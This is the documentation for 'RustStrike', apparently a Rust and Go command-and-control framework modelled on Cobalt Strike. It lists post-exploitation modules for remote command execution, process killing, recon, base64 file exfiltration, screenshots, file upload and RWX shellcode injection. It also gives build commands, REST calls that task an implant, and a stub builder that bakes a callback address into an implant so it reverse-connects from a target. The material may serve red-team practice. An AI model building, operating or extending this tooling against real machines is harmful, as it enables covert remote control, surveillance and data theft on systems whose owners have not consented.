# Example BOFs

RustStrike ships a small BOF library under `examples/`. Each is a C file
compiled to an x64 COFF object and exposes the standard `go(char* args, int alen)`
entry point.

| BOF | Args | What it does |
|---|---|---|
| `hello.c` | none | Test BOF. `BeaconPrintf(CALLBACK_OUTPUT, "hello from bof")`. |
| `cmd_exec.c` | raw text (the command) | Runs `cmd.exe /c <cmd>`, captures stdout/stderr. Converts the console's OEM/ANSI codepage (GBK/CP936) to UTF-8 before returning, so Chinese output renders cleanly in the GUI. Drives the Terminal's `cmd` mode. |
| `powershell_exec.c` | raw text (the script) | Runs `powershell.exe -NoProfile -NonInteractive -Command <script>`, captures output, ACP→UTF-8. Drives the Terminal's `PowerShell` mode. |
| `winapi_exec.c` | raw text (the command line) | Runs the typed line **directly** via `CreateProcessA` (no `cmd.exe`/`powershell.exe` wrapper). First token is the exe; pass a full path if not on PATH. Captures stdout+stderr, ACP→UTF-8. Drives the Terminal's `WinAPI` mode. No shell features (pipes/redirects/builtins) — use `cmd_exec` for those. |
| `ps.c` | none | Lists processes via `CreateToolhelp32Snapshot` (`PID PPID NAME`). Column-formatted. |
| `proc_list.c` | none | Lists processes, TAB-separated `NAME\tPID\tPPID\tTHREADS`. Drives `ProcessList.vue` (the Processes tab). |
| `proc_kill.c` | bstr (PID) | `OpenProcess(PROCESS_TERMINATE) + TerminateProcess`. Drives the Processes-tab Kill button. |
| `ls.c` | raw text path (optional, default `.`) | Lists a directory via `FindFirstFileA` (`TYPE SIZE NAME`). Column-formatted. |
| `file_list.c` | bstr (path, optional) | Lists a directory via `FindFirstFileW` (Unicode-safe — non-ASCII/Chinese paths + names round-trip via UTF-8↔UTF-16), `CWD: <path>` header + `D/F\tNAME\tSIZE\tEPOCH` per entry. Drives `FileBrowser.vue` (the Files tab). |
| `sysinfo.c` | none | Recon BOF. Emits `KEY=VALUE` lines: `internal_ip` (UDP-connect trick), `external_ip` (HTTP GET `http://ifconfig.me/ip`), `user`, `computer`, `process`, `pid`, `os`+`os_build` (`NTDLL$RtlGetVersion`), `arch`, `online_time`. The Go core auto-runs this on every implant connect and parses it to populate the agent table. |
| `download.c` | raw text path | Reads a file (≤2 MB) and prints it base64-encoded; the operator decodes to recover the file. Binary-safe via `BeaconOutput(len)`. |
| `file_download.c` | bstr (path) | Reads a file (≤2 MB), prints `=== FILE: <path> ===\n<base64>`. Drives `FileBrowser.vue`'s download action (frontend strips the header, base64-decodes the rest, saves a Blob). |
| `screenshot.c` | none | Captures the desktop via BitBlt, downscales to fit the core's ~4 MB line buffer, writes a **BMP** (`BITMAPFILEHEADER`+`INFOHEADER`+BGR pixels), prints `=== SCREENSHOT: <W>x<H> ===\n<base64>`. Drives `ScreenshotViewer.vue` (which hardcodes `data:image/bmp;base64,`). |
| `upload.c` | CS packed: two `BeaconDataExtract` blobs (remote path, then file contents) | Writes `content` to `remote path` (`CREATE_ALWAYS`). Build the arg buffer with `tools/upload_args.py <path> <local_file>`. |
| `shellcode_exec.c` | `[2B LE len][bytes]` | Allocates RWX (`VirtualAlloc`), copies the shellcode, fires it via `CreateThread`, waits. Drives the Shellcode tab's default method. |
| `shellcode_exec_nt.c` | `[2B LE len][bytes]` | Same, but spawns the thread via `NtCreateThreadEx` (resolved from ntdll at runtime). The Shellcode tab's "recommended" method. |

`beacon.h` declares the Beacon API and the `datap` struct. Its layout **must**
match `crates/loader/src/beacon.rs` — Cobalt Strike 4.x: `original`+0, `buffer`+8,
`length`+16, `size`+20. If you change one, change the other.

## Arg formats

Three BOF arg conventions are in use:

- **Raw text** (`cmd_exec`, `powershell_exec`, `winapi_exec`, `ls`, `download`):
  the `args` buffer is the UTF-8 bytes of the string with **no length prefix**.
  Type the text directly in the GUI's Terminal, or POST
  `{"args":"<base64 of utf8>"}`.
- **bstr / `encodeBeaconString`** (`proc_kill`, `file_list`, `file_download`):
  the RustStrike frontend's framing — `[2-byte LITTLE-ENDIAN length][UTF-8
  bytes][0x00]`. The feature components (`ProcessList`/`FileBrowser`/`Screenshot`)
  send this, and each BOF parses it with an inline 2-byte-LE reader. **Note:**
  this is *not* the CS `BeaconDataExtract` format (which is 4-byte **big**-endian)
  — don't "fix" the BOFs to use `BeaconDataExtract`; the framing mismatch is
  intentional and matches `commandRegistry.ts::encodeBeaconString`.
- **CS packed** (`upload`): the standard Cobalt Strike format —
  `[4-byte big-endian length][blob]` per `BeaconDataExtract`. Use
  `tools/upload_args.py` (or the GUI's file-args source) to build the buffer.
- **`[2B LE len][bytes]`** (`shellcode_exec`, `shellcode_exec_nt`): like bstr
  but with **no null terminator** — `ShellcodeExecutor.vue` builds exactly
  `[len & 0xff, (len >> 8) & 0xff, ...bytes]`.

The GUI's `services/mockAdapter.ts` knows each BOF's `encode_type`
(`none` / `raw_string` / `beacon_string` / `raw_hex_short`) and the console
command registry (`commandRegistry.ts`) encodes typed console args accordingly.

## Build the BOFs (Windows, native)

Each BOF is a C file compiled to an x64 COFF object with the MinGW gcc
toolchain (e.g. MSYS2 / mingw-w64). `gcc` and `x86_64-w64-mingw32-gcc` both work:

```sh
gcc -c examples/hello.c -o examples/hello.x64.o
gcc -c examples/cmd_exec.c          -o examples/cmd_exec.x64.o
gcc -c examples/powershell_exec.c   -o examples/powershell_exec.x64.o
gcc -c examples/winapi_exec.c       -o examples/winapi_exec.x64.o
gcc -c examples/ps.c                -o examples/ps.x64.o
gcc -c examples/proc_list.c         -o examples/proc_list.x64.o
gcc -c examples/proc_kill.c         -o examples/proc_kill.x64.o
gcc -c examples/ls.c                -o examples/ls.x64.o
gcc -c examples/file_list.c         -o examples/file_list.x64.o
gcc -c examples/download.c          -o examples/download.x64.o
gcc -c examples/file_download.c     -o examples/file_download.x64.o
gcc -c examples/screenshot.c        -o examples/screenshot.x64.o
gcc -c examples/upload.c            -o examples/upload.x64.o
gcc -c examples/shellcode_exec.c    -o examples/shellcode_exec.x64.o
gcc -c examples/shellcode_exec_nt.c -o examples/shellcode_exec_nt.x64.o
```

Do **not** pass `-g` unless you strip debug sections afterward — `.debug_*`
sections carry relocation types the loader skips (non-fatal, but noisy). The
loader is sensitive to the reloc type numbering emitted by this toolchain (see
"Toolchain note" in `CLAUDE.md`); use the same `x86_64-w64-mingw32-gcc` that
produced the tested objects.

`.x64.o` files are gitignored (`*.o`). To stage them in the Go core's BOF
library (so the GUI can list/run them by name), copy into
`clients/server/bofs/`:

```sh
cp examples/*.x64.o clients/server/bofs/
```

## End-to-end test (single Windows host)

The Go core (`clients/server`) + Rust implant is the canonical E2E path
(the Wails GUI drives the same REST API):

```sh
# 1. Build everything (a rust-toolchain.toml pins stable MSVC)
cargo build --release
cd clients/server && go build -o server.exe .
# 2. Build + stage the BOFs (above)
# 3. Start the core (implant TCP :4444, operator HTTP :8091)
RUSTSTRIKE_BOFS=./bofs ./server.exe 4444 8091
# 4. Run the implant (reverse-connects to the core)
./target/release/ruststrike-implant.exe 127.0.0.1 4444
# 5. Drive via REST (returns a task_id; poll /api/tasks/{id} for output):
curl -s http://127.0.0.1:8091/api/implants
curl -X POST "http://127.0.0.1:8091/api/bofs/ps/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
curl -X POST "http://127.0.0.1:8091/api/bofs/proc_list/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
curl -X POST "http://127.0.0.1:8091/api/bofs/screenshot/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
curl -X POST "http://127.0.0.1:8091/api/bofs/cmd_exec/run?implant=1" -H 'Content-Type: application/json' \
  -d "{\"args\":\"$(printf 'whoami' | base64 -w0)\"}"
curl -X POST "http://127.0.0.1:8091/api/bofs/powershell_exec/run?implant=1" -H 'Content-Type: application/json' \
  -d "{\"args\":\"$(printf 'Get-Location' | base64 -w0)\"}"
# bstr-framed args (proc_kill/file_list/file_download) need a 2-byte-LE encoder:
#   python -c "import base64;p=b'C:\\Windows';n=len(p)+1;print(base64.b64encode(bytes([n&0xff,(n>>8)&0xff])+p+b'\x00').decode())"
# then POST that b64 as {"args":"..."} to /api/bofs/file_list/run?implant=1.
# 6. Or launch the GUI against the core:
cd clients/client && wails dev   # desktop console in real mode
```

The reference Rust server (`crates/server`) also works for a quick single-implant
smoke: `./target/release/ruststrike-server.exe 4444`, then `hello` /
`load examples/hello.x64.o` / `loadb examples/cmd_exec.x64.o examples/cmd_args.bin`
at its console.

## Implant stub builder (dynamic callback address/port)

The implant reads its callback host/port from an **appended-config trailer** on
its own exe at startup (else falls back to CLI args). This lets you deploy ONE
patched binary per target with a baked-in callback — no args on the target.

Trailer layout (appended to the exe bytes):
`<exe>... "RUSTSTRIKE\x01" <host> "\x00" <port> "\x00"`

Two ways to patch a base `ruststrike-implant.exe`:

```sh
# CLI tool
cd tools/stubbuilder && go build -o stubbuilder.exe .
./stubbuilder.exe ../../target/release/ruststrike-implant.exe out.exe 10.0.0.5 4444
# out.exe now reverse-connects to 10.0.0.5:4444 with no args

# or via the Go core REST (used by the GUI's Generate Agent button)
curl -X POST "http://127.0.0.1:8091/api/stub/build" \
  -H 'Content-Type: application/json' -d '{"host":"10.0.0.5","port":"4444"}'
# -> {"exe_b64":"..."}  (base64-decode to the patched exe)
```

Re-patching an already-patched exe strips the old trailer first (no
accumulation). The trailer is host:port only for v1 (no sleep/jitter/SSL yet).

## v1 limitations

- `BeaconPrintf` only captures the first two variadic arguments (x64 r8/r9).
  Format strings with more substitutions emit the extras literally. Use
  `BeaconOutput(type, data, len)` (binary-safe, no format) for large/structured
  output, as `ps`/`ls`/`download`/`screenshot` do.
- Only the data/output Beacon APIs and basic CRT are stubbed; other `Beacon*`
  calls resolve to a no-op stub that records a note.
- x64 only; x86 BOFs are not supported.
- `download`/`file_download` are capped at 2 MB so the base64 fits the core's
  4 MB line buffer.
- `screenshot` downscales the desktop (longest side halved until the BMP's
  base64 fits ~4 MB) — a full-res 1920×1080 BMP would be ~8 MB raw. The output
  is a **BMP** (the GUI hardcodes `data:image/bmp;base64,`), not PNG/JPEG.
- `proc_list` leaves the Arch/User/Path columns sparse (shows `-` in the GUI);
  populating them needs `OpenProcess` + `IsWow64Process` + token calls, not
  implemented in v1.
- Only `shellcode_exec` (VirtualAlloc+CreateThread) and `shellcode_exec_nt`
  (NtCreateThreadEx) are provided. The Shellcode tab's four other dropdown
  methods (`ntalloc`, `heap`, `callback`, `fiber`) show "not found" until
  matching BOFs are added.
- `shellcode_exec*` intentionally leaks the RWX page after execution (matches
  the loader's BOF-image-memory policy); `WaitForSingleObject` is bounded to
  30s so a hung payload doesn't wedge the implant.
